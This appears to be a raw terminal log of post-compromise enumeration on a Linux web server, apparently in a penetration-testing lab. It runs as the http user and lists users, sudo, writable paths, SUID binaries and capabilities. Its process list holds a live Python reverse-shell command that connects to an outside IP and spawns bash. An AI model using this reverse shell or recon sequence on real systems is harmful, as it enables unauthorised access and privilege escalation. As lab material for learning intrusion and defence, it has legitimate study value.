DIRSTACK=()
EUID=33
GROUPS=()
HOSTNAME=nukem
HOSTTYPE=x86_64
IFS=$' \t\n'
INVOCATION_ID=9f8408c35045400c85361a428cd85a14
JOURNAL_STREAM=8:15702
LANG=en_US.UTF-8
MACHTYPE=x86_64-pc-linux-gnu
OPTERR=1
OPTIND=1
OSTYPE=linux-gnu
PATH=/usr/local/sbin:/usr/local/bin:/usr/bin
PPID=1176
PS4='+ '
PWD=/srv/http/wp-content/uploads/simple-file-list
SHELL=/usr/sbin/bash
SHELLOPTS=braceexpand:hashall:interactive-comments
SHLVL=5
TERM=xterm-256color
UID=33
_=/usr/bin/bash

[+] PATH
$ echo "$PATH"
/usr/local/sbin:/usr/local/bin:/usr/bin

[+] HOME and SHELL
$ echo "HOME=$HOME"; echo "SHELL=$SHELL"
HOME=
SHELL=/usr/sbin/bash



```

3. User & Home Directories

```
[+] /etc/passwd
$ cat /etc/passwd
root:x:0:0::/root:/bin/bash
bin:x:1:1::/:/usr/bin/nologin
daemon:x:2:2::/:/usr/bin/nologin
mail:x:8:12::/var/spool/mail:/usr/bin/nologin
ftp:x:14:11::/srv/ftp:/usr/bin/nologin
http:x:33:33::/srv/http:/usr/bin/nologin
nobody:x:65534:65534:Nobody:/:/usr/bin/nologin
dbus:x:81:81:System Message Bus:/:/usr/bin/nologin
systemd-journal-remote:x:982:982:systemd Journal Remote:/:/usr/bin/nologin
systemd-network:x:981:981:systemd Network Management:/:/usr/bin/nologin
systemd-resolve:x:980:980:systemd Resolver:/:/usr/bin/nologin
systemd-timesync:x:979:979:systemd Time Synchronization:/:/usr/bin/nologin
systemd-coredump:x:978:978:systemd Core Dumper:/:/usr/bin/nologin
uuidd:x:68:68::/:/usr/bin/nologin
mysql:x:977:977:MariaDB:/var/lib/mysql:/usr/bin/nologin
commander:x:1000:1000::/home/commander:/bin/bash
avahi:x:976:976:Avahi mDNS/DNS-SD daemon:/:/usr/bin/nologin
colord:x:975:975:Color management daemon:/var/lib/colord:/usr/bin/nologin
lightdm:x:974:974:Light Display Manager:/var/lib/lightdm:/usr/bin/nologin
polkitd:x:102:102:PolicyKit daemon:/:/usr/bin/nologin
usbmux:x:140:140:usbmux user:/:/usr/bin/nologin
git:x:973:973:git daemon user:/:/usr/bin/git-shell

[+] home directories
$ ls -la /home
total 12
drwxr-xr-x  3 root      root      4096 Sep 18  2020 .
drwxr-xr-x 17 root      root      4096 Sep 18  2020 ..
drwxr-xr-x 10 commander commander 4096 Mar  4  2025 commander

[+] root home (if accessible)
$ ls -la /root 2>/dev/null

[+] sudo -l
$ sudo -l 2>/dev/null

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for http: 
Sorry, try again.
[sudo] password for http: 
Sorry, try again.
[sudo] password for http: 

[+] sudo -V (first 10)
$ sudo -V 2>/dev/null | head -n 10
Sudo version 1.9.3p1
Sudoers policy plugin version 1.9.3p1
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.3p1
Sudoers audit plugin version 1.9.3p1

```

4. Writable Paths & Permissions

```
[+] world-writable directories (first 50)
$ find / -writable -type d 2>/dev/null | head -n 50
/tmp
/var/lib/nginx/uwsgi
/var/lib/nginx/scgi
/var/lib/nginx/fastcgi
/var/lib/nginx/proxy
/var/lib/nginx/client-body
/var/tmp
/var/spool/mail
/var/spool/samba
/proc/1206/task/1206/fd
/proc/1206/fd
/proc/1206/map_files
/srv/http
/srv/http/wp-content
/srv/http/wp-content/uploads
/srv/http/wp-content/uploads/2026
/srv/http/wp-content/uploads/2026/01
/srv/http/wp-content/uploads/simple-file-list
/srv/http/wp-content/uploads/2020
/srv/http/wp-content/uploads/2020/09
/srv/http/wp-content/uploads/2020/10
/srv/http/wp-content/plugins
/srv/http/wp-content/plugins/akismet
/srv/http/wp-content/plugins/akismet/views
/srv/http/wp-content/plugins/akismet/_inc
/srv/http/wp-content/plugins/akismet/_inc/img
/srv/http/wp-content/themes
/srv/http/wp-content/themes/twentynineteen
/srv/http/wp-content/themes/twentynineteen/sass
/srv/http/wp-content/themes/twentynineteen/sass/modules
/srv/http/wp-content/themes/twentynineteen/sass/navigation
/srv/http/wp-content/themes/twentynineteen/sass/forms
/srv/http/wp-content/themes/twentynineteen/sass/layout
/srv/http/wp-content/themes/twentynineteen/sass/typography
/srv/http/wp-content/themes/twentynineteen/sass/blocks
/srv/http/wp-content/themes/twentynineteen/sass/mixins
/srv/http/wp-content/themes/twentynineteen/sass/media
/srv/http/wp-content/themes/twentynineteen/sass/variables-site
/srv/http/wp-content/themes/twentynineteen/sass/elements
/srv/http/wp-content/themes/twentynineteen/sass/site
/srv/http/wp-content/themes/twentynineteen/sass/site/secondary
/srv/http/wp-content/themes/twentynineteen/sass/site/header
/srv/http/wp-content/themes/twentynineteen/sass/site/primary
/srv/http/wp-content/themes/twentynineteen/sass/site/footer
/srv/http/wp-content/themes/twentynineteen/inc
/srv/http/wp-content/themes/twentynineteen/fonts
/srv/http/wp-content/themes/twentynineteen/js
/srv/http/wp-content/themes/twentynineteen/template-parts
/srv/http/wp-content/themes/twentynineteen/template-parts/post
/srv/http/wp-content/themes/twentynineteen/template-parts/header

[+] world-writable files (first 50)
$ find / -writable -type f 2>/dev/null | head -n 50
/sys/fs/cgroup/memory/user.slice/user-974.slice/session-c1.scope/cgroup.event_control
/sys/fs/cgroup/memory/user.slice/user-974.slice/user@974.service/cgroup.event_control
/sys/fs/cgroup/memory/user.slice/user-974.slice/cgroup.event_control
/sys/fs/cgroup/memory/user.slice/cgroup.event_control
/sys/fs/cgroup/memory/user.slice/user-1000.slice/user@1000.service/cgroup.event_control
/sys/fs/cgroup/memory/user.slice/user-1000.slice/cgroup.event_control
/sys/fs/cgroup/memory/user.slice/user-1000.slice/session-1.scope/cgroup.event_control
/sys/fs/cgroup/memory/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/nginx.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/mariadb.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/system-modprobe.slice/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/lightdm.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/system-vncserver.slice/vncserver@:1.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/system-vncserver.slice/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/sshd.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/tmp.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/boot-efi.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/vmtoolsd.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/sys-kernel-tracing.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/pythonflask.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/httpd.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/smb.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/upower.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
/proc/sys/kernel/ns_last_pid
/proc/1/task/1/attr/current
/proc/1/task/1/attr/exec
/proc/1/task/1/attr/fscreate
/proc/1/task/1/attr/keycreate
/proc/1/task/1/attr/sockcreate
/proc/1/task/1/attr/smack/current
/proc/1/task/1/attr/apparmor/current
/proc/1/task/1/attr/apparmor/exec
/proc/1/attr/current
/proc/1/attr/exec
/proc/1/attr/fscreate
/proc/1/attr/keycreate
/proc/1/attr/sockcreate

[+] PATH entries + writable check
$ echo "$PATH" | tr ':' '\n' | while read -r p; do [ -z "$p" ] && continue; if [ -w "$p" ]; then echo "WRITABLE: $p"; else echo "OK: $p"; fi; done
OK: /usr/local/sbin
OK: /usr/local/bin
OK: /usr/bin

[+] files owned by current user (first 50)
$ find / -user "http" -type f 2>/dev/null | head -n 50
/proc/556/task/556/fdinfo/0
/proc/556/task/556/fdinfo/1
/proc/556/task/556/fdinfo/2
/proc/556/task/556/fdinfo/3
/proc/556/task/556/fdinfo/4
/proc/556/task/556/fdinfo/6
/proc/556/task/556/fdinfo/7
/proc/556/task/556/fdinfo/8
/proc/556/task/556/fdinfo/9
/proc/556/task/556/environ
/proc/556/task/556/auxv
/proc/556/task/556/status
/proc/556/task/556/personality
/proc/556/task/556/limits
/proc/556/task/556/sched
/proc/556/task/556/comm
/proc/556/task/556/syscall
/proc/556/task/556/cmdline
/proc/556/task/556/stat
/proc/556/task/556/statm
/proc/556/task/556/maps
/proc/556/task/556/children
/proc/556/task/556/numa_maps
/proc/556/task/556/mem
/proc/556/task/556/mounts
/proc/556/task/556/mountinfo
/proc/556/task/556/clear_refs
/proc/556/task/556/smaps
/proc/556/task/556/smaps_rollup
/proc/556/task/556/pagemap
/proc/556/task/556/attr/current
/proc/556/task/556/attr/prev
/proc/556/task/556/attr/exec
/proc/556/task/556/attr/fscreate
/proc/556/task/556/attr/keycreate
/proc/556/task/556/attr/sockcreate
/proc/556/task/556/attr/smack/current
/proc/556/task/556/attr/apparmor/current
/proc/556/task/556/attr/apparmor/prev
/proc/556/task/556/attr/apparmor/exec
/proc/556/task/556/wchan
/proc/556/task/556/stack
/proc/556/task/556/schedstat
/proc/556/task/556/latency
/proc/556/task/556/cpuset
/proc/556/task/556/cgroup
/proc/556/task/556/cpu_resctrl_groups
/proc/556/task/556/oom_score
/proc/556/task/556/oom_adj
/proc/556/task/556/oom_score_adj

[+] /etc/passwd perms
$ ls -l /etc/passwd 2>/dev/null
-rw-r--r-- 1 root root 1165 Oct 14  2020 /etc/passwd

[+] /etc/shadow perms
$ ls -l /etc/shadow 2>/dev/null
-rw------- 1 root root 738 Oct 14  2020 /etc/shadow

[+] root dir perms
$ ls -la / 2>/dev/null
total 64
drwxr-xr-x  17 root root  4096 Sep 18  2020 .
drwxr-xr-x  17 root root  4096 Sep 18  2020 ..
lrwxrwxrwx   1 root root     7 Aug 21  2020 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Sep 18  2020 boot
-rwxr-xr-x   1 root root   877 Sep 18  2020 build_arch.sh
drwxr-xr-x  18 root root  3160 Mar  4  2025 dev
drwxr-xr-x  59 root root  4096 Oct 14  2020 etc
drwxr-xr-x   3 root root  4096 Sep 18  2020 home
lrwxrwxrwx   1 root root     7 Aug 21  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     7 Aug 21  2020 lib64 -> usr/lib
drwx------   2 root root 16384 Sep 18  2020 lost+found
drwxr-xr-x   2 root root  4096 Aug 21  2020 mnt
drwxr-xr-x   2 root root  4096 Aug 21  2020 opt
dr-xr-xr-x 237 root root     0 Mar  4  2025 proc
drwxr-x---   5 root root  4096 Jan 22 17:44 root
drwxr-xr-x  18 root root   540 Mar  4  2025 run
lrwxrwxrwx   1 root root     7 Aug 21  2020 sbin -> usr/bin
drwxr-xr-x   4 root root  4096 Sep 18  2020 srv
dr-xr-xr-x  13 root root     0 Mar  4  2025 sys
drwxrwxrwt   2 root root    40 Jan 22 20:12 tmp
drwxr-xr-x   8 root root  4096 Sep 30  2020 usr
drwxr-xr-x  12 root root  4096 Oct 14  2020 var


```

4. SUID / SGID / Capabilities

```
[+] SUID binaries
$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/ssh/ssh-keysign
/usr/lib/Xorg.wrap
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/bin/fusermount
/usr/bin/su
/usr/bin/ksu
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/expiry
/usr/bin/mount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/chage
/usr/bin/dosbox
/usr/bin/newgrp
/usr/bin/mount.cifs
/usr/bin/suexec
/usr/bin/vmware-user-suid-wrapper
/usr/bin/sg
/usr/bin/unix_chkpwd

[+] SGID binaries
$ find / -perm -2000 -type f 2>/dev/null
/usr/bin/wall
/usr/bin/mount.cifs
/usr/bin/vmware-user-suid-wrapper
/usr/bin/write
/usr/bin/unix_chkpwd

[+] setcap
$ getcap -r / 2>/dev/null
/usr/bin/rlogin cap_net_bind_service=ep
/usr/bin/rsh cap_net_bind_service=ep
/usr/bin/newgidmap cap_setgid=ep
/usr/bin/rcp cap_net_bind_service=ep
/usr/bin/newuidmap cap_setuid=ep


```

5. Cron & Scheduled Tasks

```
[+] /etc/crontab
$ cat /etc/crontab 2>/dev/null

[+] /etc/cron.*
$ ls -la /etc/cron.* 2>/dev/null

[+] user crontab
$ crontab -l 2>/dev/null

```

6. Processes & Network

```

[+] ps aux
$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.5  28288 11468 ?        Ss   17:33   0:00 /sbin/init
root           2  0.0  0.0      0     0 ?        S    17:33   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   17:33   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   17:33   0:00 [rcu_par_gp]
root           6  0.0  0.0      0     0 ?        I<   17:33   0:00 [kworker/0:0H-kblockd]
root           7  0.0  0.0      0     0 ?        I    17:33   0:00 [kworker/u2:0-events_power_efficient]
root           8  0.0  0.0      0     0 ?        I<   17:33   0:00 [mm_percpu_wq]
root           9  0.0  0.0      0     0 ?        S    17:33   0:00 [ksoftirqd/0]
root          10  0.0  0.0      0     0 ?        S    17:33   0:00 [rcuc/0]
root          11  0.0  0.0      0     0 ?        I    17:33   0:00 [rcu_preempt]
root          12  0.0  0.0      0     0 ?        S    17:33   0:00 [rcub/0]
root          13  0.0  0.0      0     0 ?        S    17:33   0:00 [migration/0]
root          14  0.0  0.0      0     0 ?        S    17:33   0:00 [idle_inject/0]
root          16  0.0  0.0      0     0 ?        S    17:33   0:00 [cpuhp/0]
root          17  0.0  0.0      0     0 ?        S    17:33   0:00 [kdevtmpfs]
root          18  0.0  0.0      0     0 ?        I<   17:33   0:00 [netns]
root          19  0.0  0.0      0     0 ?        S    17:33   0:00 [rcu_tasks_kthre]
root          20  0.0  0.0      0     0 ?        S    17:33   0:00 [rcu_tasks_rude_]
root          21  0.0  0.0      0     0 ?        S    17:33   0:00 [kauditd]
root          22  0.0  0.0      0     0 ?        S    17:33   0:00 [khungtaskd]
root          23  0.0  0.0      0     0 ?        S    17:33   0:00 [oom_reaper]
root          24  0.0  0.0      0     0 ?        I<   17:33   0:00 [writeback]
root          25  0.0  0.0      0     0 ?        S    17:33   0:00 [kcompactd0]
root          26  0.0  0.0      0     0 ?        SN   17:33   0:00 [ksmd]
root          27  0.0  0.0      0     0 ?        SN   17:33   0:00 [khugepaged]
root          69  0.0  0.0      0     0 ?        I<   17:33   0:00 [kintegrityd]
root          70  0.0  0.0      0     0 ?        I<   17:33   0:00 [kblockd]
root          71  0.0  0.0      0     0 ?        I<   17:33   0:00 [blkcg_punt_bio]
root          72  0.0  0.0      0     0 ?        I<   17:33   0:00 [ata_sff]
root          73  0.0  0.0      0     0 ?        I<   17:33   0:00 [edac-poller]
root          74  0.0  0.0      0     0 ?        I<   17:33   0:00 [devfreq_wq]
root          75  0.0  0.0      0     0 ?        S    17:33   0:00 [watchdogd]
root          77  0.0  0.0      0     0 ?        I<   17:33   0:00 [pm_wq]
root          78  0.0  0.0      0     0 ?        S    17:33   0:00 [kswapd0]
root          80  0.0  0.0      0     0 ?        I<   17:33   0:00 [kthrotld]
root          81  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/24-pciehp]
root          82  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/25-pciehp]
root          83  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/26-pciehp]
root          84  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/27-pciehp]
root          85  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/28-pciehp]
root          86  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/29-pciehp]
root          87  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/30-pciehp]
root          88  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/31-pciehp]
root          89  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/32-pciehp]
root          90  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/33-pciehp]
root          91  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/34-pciehp]
root          92  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/35-pciehp]
root          93  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/36-pciehp]
root          94  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/37-pciehp]
root          95  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/38-pciehp]
root          96  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/39-pciehp]
root          97  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/40-pciehp]
root          98  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/41-pciehp]
root          99  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/42-pciehp]
root         100  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/43-pciehp]
root         101  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/44-pciehp]
root         102  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/45-pciehp]
root         103  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/46-pciehp]
root         104  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/47-pciehp]
root         105  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/48-pciehp]
root         106  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/49-pciehp]
root         107  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/50-pciehp]
root         108  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/51-pciehp]
root         109  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/52-pciehp]
root         110  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/53-pciehp]
root         111  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/54-pciehp]
root         112  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/55-pciehp]
root         113  0.0  0.0      0     0 ?        I<   17:33   0:00 [acpi_thermal_pm]
root         114  0.0  0.0      0     0 ?        I<   17:33   0:00 [nvme-wq]
root         115  0.0  0.0      0     0 ?        I<   17:33   0:00 [nvme-reset-wq]
root         116  0.0  0.0      0     0 ?        I<   17:33   0:00 [nvme-delete-wq]
root         117  0.0  0.0      0     0 ?        I<   17:33   0:00 [ipv6_addrconf]
root         126  0.0  0.0      0     0 ?        I<   17:33   0:00 [kstrp]
root         131  0.0  0.0      0     0 ?        I<   17:33   0:00 [zswap1]
root         132  0.0  0.0      0     0 ?        I<   17:33   0:00 [zswap1]
root         133  0.0  0.0      0     0 ?        I<   17:33   0:00 [zswap-shrink]
root         134  0.0  0.0      0     0 ?        I<   17:33   0:00 [kworker/u3:0]
root         135  0.0  0.0      0     0 ?        I<   17:33   0:00 [charger_manager]
root         163  0.0  0.0      0     0 ?        I    17:33   0:00 [kworker/0:2-events]
root         165  0.0  0.0      0     0 ?        S    17:33   0:00 [scsi_eh_0]
root         166  0.0  0.0      0     0 ?        S    17:33   0:00 [scsi_eh_1]
root         167  0.0  0.0      0     0 ?        I<   17:33   0:00 [scsi_tmf_0]
root         168  0.0  0.0      0     0 ?        I<   17:33   0:00 [scsi_tmf_1]
root         169  0.0  0.0      0     0 ?        S    17:33   0:00 [scsi_eh_2]
root         170  0.0  0.0      0     0 ?        I<   17:33   0:00 [vmw_pvscsi_wq_1]
root         171  0.0  0.0      0     0 ?        I<   17:33   0:00 [scsi_tmf_2]
root         172  0.0  0.0      0     0 ?        I    17:33   0:00 [kworker/u2:2-events_unbound]
root         174  0.0  0.0      0     0 ?        I<   17:33   0:00 [kworker/0:1H-kblockd]
root         187  0.0  0.0      0     0 ?        S    17:33   0:00 [jbd2/sda2-8]
root         188  0.0  0.0      0     0 ?        I<   17:33   0:00 [ext4-rsv-conver]
root         214  0.0  0.9  71840 20076 ?        Ss   17:33   0:00 /usr/lib/systemd/systemd-journald
root         223  0.0  0.4  33284  9528 ?        Ss   17:33   0:00 /usr/lib/systemd/systemd-udevd
root         246  0.0  0.0      0     0 ?        I<   17:33   0:00 [cryptd]
dbus         282  0.0  0.2   7420  4444 ?        Ss   17:33   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root         284  0.0  0.4  19040  9008 ?        Ss   17:33   0:00 /usr/lib/systemd/systemd-logind
root         285  0.0  0.3 160064  7504 ?        Ssl  17:33   0:04 /usr/bin/vmtoolsd
root         295  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/16-vmwgfx]
root         296  0.0  0.0      0     0 ?        I<   17:33   0:00 [ttm_swap]
root         348  0.0  1.1  74076 22368 ?        Ss   17:33   0:00 /usr/bin/httpd -k start -DFOREGROUND
root         350  0.0  0.2   8784  5668 ?        Ss   17:33   0:00 sshd: /usr/bin/sshd -D [listener] 0 of 10-100 startups
root         356  0.0  0.3 231300  6932 ?        Ssl  17:33   0:00 /usr/bin/lightdm
root         365  0.0  0.1   5888  3260 ?        Ss   17:33   0:00 /usr/bin/vncsession commander :1
root         366  0.0  0.0      0     0 ?        Z    17:33   0:00 [vncsession] <defunct>
root         376  0.0  2.7 183940 56464 tty7     Ss+  17:33   0:00 /usr/lib/Xorg :0 -seat seat0 -auth /run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
command+     377  0.0  0.5  20472 10316 ?        Ss   17:33   0:00 /usr/lib/systemd/systemd --user
mysql        382  0.0  4.2 631092 86108 ?        Ssl  17:33   0:01 /usr/bin/mariadbd
command+     383  0.0  0.1  31924  2840 ?        S    17:33   0:00 (sd-pam)
command+     389  0.0  0.0   3876  1152 ?        S    17:33   0:00 xinit /etc/lightdm/Xsession startxfce4 -- /usr/bin/Xvnc :1 -alwaysshared -geometry 1024x728 -localhost -auth /home/commander/.Xauthority -desktop nukem:1 (commander) -fp /usr/share/fonts/75dpi,/usr/share/fonts/100dpi -pn -rfbauth /home/commander/.vnc/passwd -rfbport 5901 -rfbwait 30000
http         391  0.0  0.9  74812 18400 ?        S    17:33   0:00 /usr/bin/httpd -k start -DFOREGROUND
http         392  0.0  0.9  74792 18796 ?        S    17:33   0:00 /usr/bin/httpd -k start -DFOREGROUND
http         393  0.0  0.9  74792 18500 ?        S    17:33   0:00 /usr/bin/httpd -k start -DFOREGROUND
http         394  0.0  0.9  74812 18784 ?        S    17:33   0:00 /usr/bin/httpd -k start -DFOREGROUND
http         395  0.0  0.9  74812 18512 ?        S    17:33   0:00 /usr/bin/httpd -k start -DFOREGROUND
command+     402  0.0  3.6 199496 74528 ?        S    17:33   0:00 /usr/bin/Xvnc :1 -alwaysshared -geometry 1024x728 -localhost -auth /home/commander/.Xauthority -desktop nukem:1 (commander) -fp /usr/share/fonts/75dpi,/usr/share/fonts/100dpi -pn -rfbauth /home/commander/.vnc/passwd -rfbport 5901 -rfbwait 30000
command+     415  0.0  2.9 405096 59948 ?        Sl   17:33   0:00 xfce4-session
command+     420  0.0  0.2   7256  4284 ?        Ss   17:33   0:00 /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root         422  0.0  0.3 160256  7620 ?        Sl   17:33   0:00 lightdm --session-child 18 21
lightdm      428  0.0  0.5  20276 10160 ?        Ss   17:33   0:00 /usr/lib/systemd/systemd --user
lightdm      430  0.0  0.1  31924  2916 ?        S    17:33   0:00 (sd-pam)
lightdm      439  0.0  3.5 415564 72348 ?        Ssl  17:33   0:01 /usr/bin/lightdm-gtk-greeter
lightdm      441  0.0  0.1   6960  3724 ?        Ss   17:33   0:00 /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
lightdm      442  0.0  0.3 304152  6124 ?        Ssl  17:33   0:00 /usr/lib/at-spi-bus-launcher
lightdm      448  0.0  0.1   6960  3532 ?        S    17:33   0:00 /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 3
command+     449  0.0  0.3 304152  6420 ?        Ssl  17:33   0:00 /usr/lib/at-spi-bus-launcher
command+     455  0.0  0.1   7092  4048 ?        S    17:33   0:00 /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 3
command+     459  0.0  0.2 229176  5680 ?        Sl   17:33   0:00 /usr/lib/xfce4/xfconf/xfconfd
polkitd      469  0.0  1.0 2569800 20400 ?       Ssl  17:33   0:00 /usr/lib/polkit-1/polkitd --no-debug
command+     470  0.0  0.3 160720  7280 ?        Sl   17:33   0:00 /usr/lib/at-spi2-registryd --use-gnome-session
command+     482  0.0  0.0   5892   448 ?        Ss   17:33   0:00 /usr/bin/ssh-agent -s
command+     485  0.0  0.0 151796  1284 ?        SLs  17:33   0:00 /usr/bin/gpg-agent --supervised
command+     487  0.0  4.1 352460 83772 ?        Sl   17:33   0:00 xfwm4
root         491  0.0  0.2  12868  6060 ?        S    17:33   0:00 lightdm --session-child 14 21
lightdm      494  0.0  0.2 160580  5728 ?        Sl   17:33   0:00 /usr/lib/at-spi2-registryd --use-gnome-session
command+     498  0.0  0.9 218104 20000 ?        Ssl  17:33   0:00 xfsettingsd
command+     499  0.0  1.4 261528 30032 ?        Sl   17:33   0:00 xfce4-panel
command+     505  0.0  1.0 331484 22228 ?        Sl   17:33   0:00 Thunar --daemon
command+     510  0.0  1.6 265880 34144 ?        Sl   17:33   0:00 xfdesktop
command+     511  0.0  1.0 182616 21784 ?        Sl   17:33   0:00 /usr/lib/xfce4/panel/wrapper-2.0 /usr/lib/xfce4/panel/plugins/libsystray.so 6 12582920 systray Notification Area Area where notification icons appear
command+     512  0.0  1.3 185780 27120 ?        Sl   17:33   0:00 /usr/lib/xfce4/panel/wrapper-2.0 /usr/lib/xfce4/panel/plugins/libxfce4powermanager.so 9 12582921 power-manager-plugin Power Manager Plugin Display the battery levels of your devices and control the brightness of your display
command+     513  0.0  1.1 184500 24332 ?        Sl   17:33   0:00 /usr/lib/xfce4/panel/wrapper-2.0 /usr/lib/xfce4/panel/plugins/libactions.so 14 12582922 actions Action Buttons Log out, lock or other system actions
root         523  0.0  0.4 312332  8916 ?        Ssl  17:33   0:00 /usr/lib/upowerd
command+     527  0.0  1.0  39432 22064 ?        S    17:33   0:04 /usr/bin/vmtoolsd -n vmusr
command+     531  0.0  1.0 182012 20340 ?        Sl   17:33   0:00 /usr/lib/polkit-gnome/polkit-gnome-authentication-agent-1
command+     537  0.0  0.9 182980 18928 ?        Ssl  17:33   0:00 xfce4-power-manager
root         553  0.0  1.5  44804 31636 ?        Ss   17:35   0:01 /usr/bin/python /home/commander/python_rest_flask/server.py
root         554  0.0  1.3  85552 27288 ?        Ss   17:35   0:00 /usr/bin/smbd --foreground --no-process-group -p36445 ## Type: string ## Default: ## ServiceRestart: nmb NMBDOPTIONS= ## Type: string ## Default: ## ServiceRestart: winbind WINBINDOPTIONS=
root         555  0.0  0.0   9132  1100 ?        Ss   17:35   0:00 nginx: master process /usr/bin/nginx -g pid /run/nginx.pid; error_log stderr;
http         556  0.0  0.1   9916  3592 ?        S    17:35   0:00 nginx: worker process
root         558  0.0  0.4  83328  9444 ?        S    17:35   0:00 /usr/bin/smbd --foreground --no-process-group -p36445 ## Type: string ## Default: ## ServiceRestart: nmb NMBDOPTIONS= ## Type: string ## Default: ## ServiceRestart: winbind WINBINDOPTIONS=
root         559  0.0  0.2  83320  4744 ?        S    17:35   0:00 /usr/bin/smbd --foreground --no-process-group -p36445 ## Type: string ## Default: ## ServiceRestart: nmb NMBDOPTIONS= ## Type: string ## Default: ## ServiceRestart: winbind WINBINDOPTIONS=
root         560  0.0  0.4  85552  9880 ?        S    17:35   0:00 /usr/bin/smbd --foreground --no-process-group -p36445 ## Type: string ## Default: ## ServiceRestart: nmb NMBDOPTIONS= ## Type: string ## Default: ## ServiceRestart: winbind WINBINDOPTIONS=
systemd+     613  0.0  0.4  19388  9092 ?        Ss   17:44   0:00 /usr/lib/systemd/systemd-networkd
root         614  0.0  0.0      0     0 ?        I    17:44   0:00 [kworker/0:3-events]
http         636  0.0  0.9  74812 18808 ?        S    17:45   0:00 /usr/bin/httpd -k start -DFOREGROUND
http         646  0.0  0.9  74808 18520 ?        S    17:47   0:00 /usr/bin/httpd -k start -DFOREGROUND
root         852  0.0  0.0      0     0 ?        I    18:58   0:00 [kworker/u2:1-events_power_efficient]
http         853  0.0  0.4  10724  8620 ?        S    18:59   0:00 python3 -c import os,pty,socket;s=socket.socket();s.connect(("192.168.45.151",80));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")
http         854  0.0  0.1   4428  3640 pts/0    Ss+  18:59   0:00 /bin/bash
